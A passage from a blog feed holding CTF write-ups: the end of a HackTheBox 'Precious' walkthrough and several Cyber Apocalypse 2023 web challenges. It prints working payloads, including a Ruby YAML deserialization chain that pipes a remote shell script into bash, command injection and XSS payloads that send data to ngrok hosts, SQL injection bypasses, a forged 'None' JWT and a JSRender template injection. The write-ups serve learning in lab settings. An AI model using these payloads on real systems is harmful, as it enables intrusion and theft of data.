<p><em>henry</em> is not in any special group. Checking <code class="language-plaintext highlighter-rouge">sudo</code> perms showed he can run a custom script;</p>

<p><img src="/assets/img/Pasted image 20230325065608.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325065910.png" alt="" /></p>

<p>Notice that at line <strong>10</strong>, the program is loading a <em>YAML</em> file using relative path, which means we could be able to control the file being read. Using the guide in <a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">this post</a>, I was able to get code execution as <code class="language-plaintext highlighter-rouge">root</code> using the following payload;</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="nn">---</span>
 <span class="pi">-</span> <span class="kt">!ruby/object:Gem::Installer</span>
     <span class="na">i</span><span class="pi">:</span> <span class="s">x</span>
 <span class="pi">-</span> <span class="kt">!ruby/object:Gem::SpecFetcher</span>
     <span class="na">i</span><span class="pi">:</span> <span class="s">y</span>
 <span class="pi">-</span> <span class="kt">!ruby/object:Gem::Requirement</span>
   <span class="na">requirements</span><span class="pi">:</span>
     <span class="kt">!ruby/object:Gem::Package::TarReader</span>
     <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::BufferedIO</span>
       <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::Package::TarReader::Entry</span>
          <span class="na">read</span><span class="pi">:</span> <span class="m">0</span>
          <span class="na">header</span><span class="pi">:</span> <span class="s2">"</span><span class="s">abc"</span>
       <span class="na">debug_output</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
          <span class="na">socket</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::RequestSet</span>
              <span class="na">sets</span><span class="pi">:</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
                  <span class="na">socket</span><span class="pi">:</span> <span class="kt">!ruby/module</span> <span class="s1">'</span><span class="s">Kernel'</span>
                  <span class="na">method_id</span><span class="pi">:</span> <span class="s">:system</span>
              <span class="na">git_set</span><span class="pi">:</span> <span class="s">curl 10.10.16.6/shell.sh | bash</span>
          <span class="na">method_id</span><span class="pi">:</span> <span class="s">:resolve</span> 
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230325070521.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP identified a web server.</li>
  <li>Site is used for converting web pages from a URL to a PDF
    <ul>
      <li>Uses <em>pdfkit v0.8.6</em>, which is vulnerable to <strong>CVE-2022-25765</strong></li>
      <li>Gained code execution as <em>ruby</em></li>
    </ul>
  </li>
  <li><em>ruby</em>;
    <ul>
      <li>Found the creds of <em>henry</em> at <code class="language-plaintext highlighter-rouge">/home/ruby/.bundle/config</code></li>
    </ul>
  </li>
  <li><em>henry</em>
    <ul>
      <li>Has <code class="language-plaintext highlighter-rouge">sudo</code> perms on a custom script that loads <code class="language-plaintext highlighter-rouge">dependencies.yml</code> using relative path.</li>
      <li>Exploited <em>YAML</em> deserialization to get code execution as <code class="language-plaintext highlighter-rouge">root</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="easy" /><category term="linux" /><category term="web" /><category term="pdfkit" /><category term="wkhtmltopdf" /><category term="ruby" /><category term="deserialization" /><category term="yaml" /><category term="yaml deserialization" /><summary type="html"><![CDATA[Precious is a very easy linux machine on HackTheBox. It starts with exploiting a web application that generates a PDF file based on the output of a URL. Lateral movement to a local user involves finding a password in a configuration file, and a custom YAML deserialization exploit to elevate to root.]]></summary></entry><entry><title type="html">Cyber Apocalypse 2023 - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" rel="alternate" type="text/html" title="Cyber Apocalypse 2023 - HackTheBox" /><published>2023-03-23T00:00:00+01:00</published><updated>2023-03-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html"><![CDATA[<p><strong>Cyber Apocalypse 2023</strong> is a very nice jeopardy-style CTF competition hosted by <em>HackTheBox</em>. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition.</p>

<p><br /></p>

<h3 id="web">Web</h3>
<p><br /></p>

<h4 id="trapped-source">Trapped Source</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Challenge has no downloadables. Starting the container and going to homepage showed a lock;</p>

<p><img src="/assets/img/20230323061832.png" alt="" /></p>

<p>Checking the page source showed the correct PIN;</p>

<p><img src="/assets/img/20230323061930.png" alt="" /></p>

<p>Entering it revealed the flag;</p>

<p><img src="/assets/img/20230323062019.png" alt="" /></p>

<p><br /></p>

<h4 id="gunhead">Gunhead</h4>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Site has some sort of console for running commands;</p>

<p><img src="/assets/img/20230323062644.png" alt="" /></p>

<p>The output of the <code class="language-plaintext highlighter-rouge">/ping</code> command looks very similar to that generated by the <code class="language-plaintext highlighter-rouge">ping</code> utility. Checking <em>burp</em> showed the request was made to <code class="language-plaintext highlighter-rouge">/api/ping</code>;</p>

<p><img src="/assets/img/20230323062829.png" alt="" /></p>

<p>Going through the downloaded source files, the code that handles the request was found in <code class="language-plaintext highlighter-rouge">models/ReconModel.php</code>;</p>

<p><img src="/assets/img/20230323063045.png" alt="" /></p>

<p>This is clearly vulnerable to shell command injection. The <code class="language-plaintext highlighter-rouge">Dockerfile</code> showed that the flag is saved locally as <code class="language-plaintext highlighter-rouge">/flag.txt</code>, which I was able to read using <code class="language-plaintext highlighter-rouge">curl</code> to make a request to my server with the file contents;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"ip"</span><span class="p">:</span><span class="s2">"`curl http://0cbd-102-91-4-18.ngrok.io/$(cat /flag.txt | base64 -w 0)`"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20230323063540.png" alt="" /></p>

<p><br /></p>

<h4 id="drobots">DRobots</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Site has a login page;</p>

<p><img src="/assets/img/20230323063838.png" alt="" /></p>

<p><img src="/assets/img/20230323063947.png" alt="" /></p>

<p>Going through the downloaded source, the function that handles login is clearly vulnerable to <em>SQL Injection</em>;</p>

<p><img src="/assets/img/20230323064458.png" alt="" /></p>

<p>Bypassed auth successfully by setting <code class="language-plaintext highlighter-rouge">username</code> to <code class="language-plaintext highlighter-rouge">" or 1=1-- -</code>;</p>

<p><img src="/assets/img/20230323064550.png" alt="" /></p>

<p><br /></p>

<h4 id="passman">Passman</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p><img src="/assets/img/20230323064948.png" alt="" /></p>

<p>Clicking the <strong>Create</strong> button opened a registration form, and I was able to create an account and login. The app is a password manager;</p>

<p><img src="/assets/img/20230323065217.png" alt="" /></p>

<p>Burp showed some requests to <code class="language-plaintext highlighter-rouge">/graphql</code> endpoint, which is used for GraphQL queries.</p>

<p>Our login request generated the query;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"query"</span><span class="p">:</span><span class="s2">"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }"</span><span class="p">,</span><span class="nl">"variables"</span><span class="p">:{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"testuser"</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"testpass"</span><span class="p">}}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>The implementation was found at <code class="language-plaintext highlighter-rouge">helpers/GaphqlHelper.js</code> in the downloaded files;</p>

<p><img src="/assets/img/20230323065836.png" alt="" /></p>

<p>Just below the above code is another named <code class="language-plaintext highlighter-rouge">UpdatePassword</code> that seems interesting;</p>

<p><img src="/assets/img/20230323065906.png" alt="" /></p>

<p>Notice how, although there is a check to ensure the user is authenticated, the function is calling <code class="language-plaintext highlighter-rouge">db.updatePassword()</code> with the username and password supplied by the user. <code class="language-plaintext highlighter-rouge">updatePassword()</code> is implemented in <code class="language-plaintext highlighter-rouge">database.js</code> file;</p>

<p><img src="/assets/img/20230323070301.png" alt="" /></p>

<p>As can be seen above, the application is using user-defined username to update password, which means we could reset the password of another user. Note that the <code class="language-plaintext highlighter-rouge">entrypoint.sh</code> file showed that a user named <em>admin</em> exists.</p>

<p>There is no option in the web UI for changing user password. So I tried updating the request used for <code class="language-plaintext highlighter-rouge">LoginUser</code> as it has similar structure with <code class="language-plaintext highlighter-rouge">UpdatePassword</code> to reset the password of <em>admin</em>, and it worked!</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /graphql HTTP/1.1
Host: 139.59.176.230:30434
Content-Length: 195
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en
Origin: http://139.59.176.230:30434
Referer: http://139.59.176.230:30434/dashboard
Accept-Encoding: gzip, deflate
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOjAsImlhdCI6MTY3OTU1MDYxNn0.hHFrRgThAy4kvGO546KjdvNquPXk3NPknaJt_VvB_P4
Connection: close

{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"testpass"}}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I was able to login using <code class="language-plaintext highlighter-rouge">admin:testpass</code>;</p>

<p><img src="/assets/img/20230323071013.png" alt="" /></p>

<p><br /></p>

<h4 id="orbital">Orbital</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p><img src="/assets/img/20230323071313.png" alt="" /></p>

<p>Login request;</p>

<p><img src="/assets/img/20230323071445.png" alt="" /></p>

<p>Login handler is implemented in <code class="language-plaintext highlighter-rouge">routes.py</code> and <code class="language-plaintext highlighter-rouge">database.py</code>;</p>

<p><img src="/assets/img/20230323071724.png" alt="" /></p>

<p><img src="/assets/img/20230323071756.png" alt="" /></p>

<p>The above is clearly vulnerable to <em>SQL Injection</em>, but the call to <code class="language-plaintext highlighter-rouge">passwordVerify()</code> may complicate things;</p>

<p><img src="/assets/img/20230323071931.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">passwordVeryify()</code> function is simply checking to make sure the password we entered matched the hashed (MD5) password that was retrieved from the query. Since we can control the query using the SQL injection bug, we can make it return a hash whose plaintext we already know (Example: <code class="language-plaintext highlighter-rouge">179ad45c6ce2cb97cf1029e212046e81</code>, which is <code class="language-plaintext highlighter-rouge">testpass</code>). Since the query returns only two columns (username, and password), we can use a UNION query to return our own values by setting <code class="language-plaintext highlighter-rouge">username</code> to <code class="language-plaintext highlighter-rouge">" union select 'admin', '179ad45c6ce2cb97cf1029e212046e81'-- -</code> and <code class="language-plaintext highlighter-rouge">password</code> to <code class="language-plaintext highlighter-rouge">testpass</code>;</p>

<p><img src="/assets/img/20230323072526.png" alt="" /></p>

<p>It worked!</p>

<p><img src="/assets/img/20230323072808.png" alt="" /></p>

<p>The lower part of the page has a listing, and clicking on <em>export</em> initiated a download;</p>

<p><img src="/assets/img/20230323072909.png" alt="" /></p>

<p>The request was made to <code class="language-plaintext highlighter-rouge">/api/export</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /api/export HTTP/1.1
Host: 138.68.162.218:31631
Content-Length: 28
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en
Origin: http://138.68.162.218:31631
Referer: http://138.68.162.218:31631/home
Accept-Encoding: gzip, deflate
Cookie: session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVOVGMwTkRVd2ZRLk9YMDNVd2NRRUdKUGJUZDZfNWE5SmNISDFSb2lJa0c1NU5WRTB0V3ZGVFUifQ.ZBvxUg.ZGT_pJMLFlN-rF7GxVnxfIndbFc
Connection: close

{"name":"communication.mp3"}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The implementation is clearly vulnerable to <em>Local File Inclusion (LFI)</em>;</p>

<p><img src="/assets/img/20230323073229.png" alt="" /></p>

<p>From the downloaded <code class="language-plaintext highlighter-rouge">Dockerfile</code>, flag is saved as <code class="language-plaintext highlighter-rouge">/signal_sleuth_firmware</code>. Using the LFI, I was able to read it;</p>

<p><img src="/assets/img/20230323073442.png" alt="" /></p>

<p><br /></p>

<h4 id="didactic-octo-paddles">Didactic Octo Paddles</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<p><img src="/assets/img/20230323073753.png" alt="" /></p>

<p>An <em>Express</em> web app. Going through downloaded source code showed a hidden route <code class="language-plaintext highlighter-rouge">/register</code>, which allowed me to register and login;</p>

<p><img src="/assets/img/20230323074058.png" alt="" /></p>

<p>Nothing of much interest in the dashboard. Going through more of the source code showed another route <code class="language-plaintext highlighter-rouge">/admin</code>;</p>

<p><img src="/assets/img/20230323074323.png" alt="" /></p>

<p>The route is protected by a <em>middleware</em>, which are commonly used in <em>Express</em> apps for access control. The implementation is in <code class="language-plaintext highlighter-rouge">AdminMiddleware.js</code>;</p>

<p><img src="/assets/img/20230323074717.png" alt="" /></p>

<p>As can be seen above, the error message we are getting when going to <code class="language-plaintext highlighter-rouge">/admin</code> was generated by this middleware, which means the <code class="language-plaintext highlighter-rouge">/admin</code> route handler in <code class="language-plaintext highlighter-rouge">index.js</code> was never actually used.</p>

<p>The application is also dangerously using the <em>algrorithm</em> defined in user-supplied JWT for verification (line <code class="language-plaintext highlighter-rouge">28</code>), although the first check (line <code class="language-plaintext highlighter-rouge">13</code>) is attempting to prevent user from bypassing verification by setting the algorithm to <code class="language-plaintext highlighter-rouge">none</code>. The header of the JWT issued by the website after login was <code class="language-plaintext highlighter-rouge">{"alg":"HS256","typ":"JWT"}</code>.</p>

<p>Running some local tests, I realised that the value passed in  <code class="language-plaintext highlighter-rouge">alg</code> is case-insensitive. Since the web app is blocking use of <code class="language-plaintext highlighter-rouge">none</code> as the value of <code class="language-plaintext highlighter-rouge">alg</code> in a case-sensitive manner, setting it to <code class="language-plaintext highlighter-rouge">None</code> will bypass this check.</p>

<p>The body of the token issued to us after login decodes to;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="nl">"iat"</span><span class="p">:</span><span class="mi">1679553628</span><span class="p">,</span><span class="nl">"exp"</span><span class="p">:</span><span class="mi">1679557228</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Since the <code class="language-plaintext highlighter-rouge">database.js</code> file showed that a user named <code class="language-plaintext highlighter-rouge">admin</code> is created when the app is first run, and the ID column is set to auto-increment, we can be sure that the admin’s ID is <code class="language-plaintext highlighter-rouge">1</code>. So I cracted a token with <code class="language-plaintext highlighter-rouge">alg</code> set to <code class="language-plaintext highlighter-rouge">None</code>,  <code class="language-plaintext highlighter-rouge">id</code> set to <code class="language-plaintext highlighter-rouge">1</code>, and signature part of the token deleted. It worked!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5NTUzNjI4LCJleHAiOjE2Nzk1NTcyMjh9.
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20230323080423.png" alt="" /></p>

<p>Nothing of much interest is in the admin dashboard, only names of users. Checking the source code showed that it uses <em>JSRender</em> to display data, which could be vulnerable to <em>Server Side Template Injection (SSTI)</em> if the usernames are not <a href="https://appcheck-ng.com/template-injection-jsrender-jsviews">properly validated</a>;</p>

<p><img src="/assets/img/20230323080743.png" alt="" /></p>

<p>Creating a user with name <code class="language-plaintext highlighter-rouge">{{:7*7}}</code> evaluated the username to <code class="language-plaintext highlighter-rouge">49</code>, which confirmed the vulnerability. <code class="language-plaintext highlighter-rouge">Dockerfile</code> confirmed the flag is at <code class="language-plaintext highlighter-rouge">/flag.txt</code>, so I used the vulnerability to read it using the payload;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"{{:</span><span class="se">\"</span><span class="s2">pwnd</span><span class="se">\"</span><span class="s2">.toString.constructor.call({},</span><span class="se">\"</span><span class="s2">return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()</span><span class="se">\"</span><span class="s2">)()}}"</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"testpass"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Refreshing the admin dashboard, I got the flag;</p>

<p><img src="/assets/img/20230323122819.png" alt="" /></p>

<p><br /></p>

<h4 id="spybug">SpyBug</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<p><img src="/assets/img/20230323123242.png" alt="" /></p>

<p>Login form is POSTed to <code class="language-plaintext highlighter-rouge">/panel/login</code>. Going through the downloaded source, here is the implementation;</p>

<p><img src="/assets/img/20230323123625.png" alt="" /></p>

<p><img src="/assets/img/20230323123815.png" alt="" /></p>

<p>Notice that the <code class="language-plaintext highlighter-rouge">username</code> passed to the <code class="language-plaintext highlighter-rouge">checkUserLogin()</code> function was not casted to a string, and was later used in a <em>NoSQL</em> query. This could’ve been vulnerable to <em>NoSQL</em> injection by passing <code class="language-plaintext highlighter-rouge">username</code> as a JSON object, if not for the call to <code class="language-plaintext highlighter-rouge">bcrypt.compareSync()</code> that validates the password entered.</p>

<p>Looking deeper into the code, there are routes defined for <em>agents</em> in <code class="language-plaintext highlighter-rouge">routes/agents.js</code> file;</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/agents/register</code> - GET request. Creates a new agent, and return the agent’s identifier and token.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/check/:identifier/:token</code> - GET request. Returns a code <code class="language-plaintext highlighter-rouge">200</code> HTTP response if agent is valid.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/details/:identifier/:token</code> - POST request. For updating agent info. Accepts a json of <code class="language-plaintext highlighter-rouge">hostname</code>, <code class="language-plaintext highlighter-rouge">platform</code>, and <code class="language-plaintext highlighter-rouge">arch</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/upload/:identifier/:token</code> - Multipart POST request for uploading file to <code class="language-plaintext highlighter-rouge">/uploads/</code>, which is publicly accessible.</li>
</ul>

<p>The expose upload feature is interesting. It uses some metadata checks to validate files being uploaded, which can be easily forged;</p>

<p><img src="/assets/img/20230323125527.png" alt="" /></p>

<p>Another filter is also in place that validates uploaded file contents, but the regex used is very loose;</p>

<p><img src="/assets/img/20230323125202.png" alt="" /></p>

<p>The above check can be passed by writing a string that matches the regex in uploaded file, independent of position;</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c1">// RIFFAAAAWAVE - Whitelisted bytes in JS comment. Totally valid</span>
<span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Looking into how agents are handled, I found that the code for updating agents info does not do any sanitation;</p>

<p><img src="/assets/img/20230323125849.png" alt="" /></p>

<p><img src="/assets/img/20230323125937.png" alt="" /></p>

<p>This is interesting because all agents are rendered at the administrators homepage after login. This could be used to execute stored XSS on the admin.</p>

<p>The NodeJS server runs a <em>Puppeteer</em> bot that authenticates as admin every 60 seconds;</p>

<p><img src="/assets/img/20230323130639.png" alt="" /></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">dotenv</span><span class="dl">"</span><span class="p">).</span><span class="nx">config</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">puppeteer</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">browserOptions</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">headless</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
  <span class="na">executablePath</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/usr/bin/chromium-browser</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">args</span><span class="p">:</span> <span class="p">[</span>
    <span class="dl">"</span><span class="s2">--no-sandbox</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-background-networking</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-default-apps</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-extensions</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-gpu</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-sync</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-translate</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--hide-scrollbars</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--metrics-recording-only</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--mute-audio</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--no-first-run</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--safebrowsing-disable-auto-update</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--js-flags=--noexpose_wasm,--jitless</span><span class="dl">"</span><span class="p">,</span>
  <span class="p">],</span>
<span class="p">};</span>

<span class="nx">exports</span><span class="p">.</span><span class="nx">visitPanel</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">(</span><span class="nx">browserOptions</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">createIncognitoBrowserContext</span><span class="p">();</span>
    <span class="kd">let</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://0.0.0.0:</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">API_PORT</span><span class="p">,</span> <span class="p">{</span>
      <span class="na">waitUntil</span><span class="p">:</span> <span class="dl">"</span><span class="s2">networkidle2</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">,</span>
    <span class="p">});</span>

    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">#username</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">#password</span><span class="dl">"</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_SECRET</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="dl">"</span><span class="s2">#loginButton</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">waitForTimeout</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>On testing XSS through agents info update locally, the injection worked but the browser blocks the code;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /agents/details/d9624cf2-3dd5-40ad-8132-fd9a292e1ef3/405cc6bc-484f-4e94-aed6-396144874213 HTTP/1.1
Host: debian.local:5000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en
Accept-Encoding: gzip, deflate
Cookie: connect.sid=s%3AvcdDZtZajSbryflLimysDJ4F8TdrUHxb.vFCYANEbw4vcD9se%2ByefOO7WT6sdMQf9%2F4tRJ3%2BbR2M
Connection: close
Content-Type: application/json
Content-Length: 116

{"hostname":"&lt;script&gt;alert(1)&lt;/script&gt;", "platform":"linux", "arch":"x86"}
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">index.js</code> showed the server is using some XSS-prevention headers (<em>Content Security Policy</em>);</p>

<p><img src="/assets/img/20230323131232.png" alt="" /></p>

<p>While the above would block all JS embedded directly, the <code class="language-plaintext highlighter-rouge">script-src 'self'</code> policy would allow injected <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags that load files on the same origin. This is a big deal since we already have an <strong>open file upload vulnerability</strong> on the server.</p>

<p>To exploit this, I wrote a JS payload <code class="language-plaintext highlighter-rouge">payload.js</code> that satisfies the regex filter. When loaded, this will base64-encode the current page content and send it to my server;</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c1">// RIFFAAAAWAVE</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`http://1e90-197-210-71-140.ngrok.io/?loot=</span><span class="p">${</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)}</span><span class="s2">`</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I then wrote a python script <code class="language-plaintext highlighter-rouge">exploit.py</code> to upload the payload and inject the XSS;</p>

